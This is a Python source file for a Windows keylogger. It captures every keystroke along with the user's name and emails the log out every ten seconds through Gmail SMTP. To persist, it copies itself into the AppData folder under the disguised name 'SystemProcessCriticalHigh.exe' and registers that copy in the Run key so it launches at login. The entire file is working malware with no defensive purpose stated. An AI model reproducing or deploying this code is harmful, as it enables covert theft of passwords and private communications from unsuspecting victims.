import keyboard, os, subprocess, sys, shutil
import smtplib
from threading import Timer
from datetime import datetime
from getpass import getuser

# from webbrowser import open as wbopen
# from base64 import b64decode
# from base64 import b64encode

SEND_REPORT_EVERY = 10
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = r""
SEND_EMAIL = r""

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def sendmail(self, to_email, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, to_email, message)
        server.quit()

    def report(self):
        if self.log:
            self.log += str(getuser()) + "\n"
            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def run_at_startup():
    location = os.environ["appdata"] + "\\SystemProcessCriticalHigh.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemProcessCriticalHigh /t REG_SZ /d "' + location + '"', shell=True)


if __name__ == "__main__":
    run_at_startup()
    # wbopen("https://www.youtube.com/watch?v=7YuAzR2XVAM")
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # print("started")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()


